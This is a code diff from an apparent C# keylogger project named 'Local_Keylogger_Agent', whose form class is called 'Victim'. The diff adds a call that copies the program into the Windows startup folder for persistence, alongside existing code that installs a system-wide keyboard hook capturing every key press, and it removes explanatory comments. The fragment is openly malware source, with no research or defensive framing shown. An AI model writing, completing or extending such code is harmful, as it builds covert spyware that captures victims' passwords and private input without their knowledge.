@@ -5,10 +5,17 @@ namespace Local_Keylogger_Agent
     public partial class Victim : Form
     {
         private IKeyboardMouseEvents globalHook;
+
         public Victim()
         {
             InitializeComponent();
+
             Storage storage = new Storage();
+
+            SelfCopy selfCopy = new SelfCopy();
+            selfCopy.CopySelfToStartup();
+
+
 
             SubscribeGlobal();
 
@@ -23,10 +30,8 @@ namespace Local_Keylogger_Agent
         // Subscribe to all global events
         private void SubscribeGlobal()
         {
-            // We get a "global" hook — it catches events all over the computer
             globalHook = Hook.GlobalEvents();
 
-            // Keyboard
             globalHook.KeyDown += GlobalHook_KeyDown;
             globalHook.KeyPress += GlobalHook_KeyPress;
         }
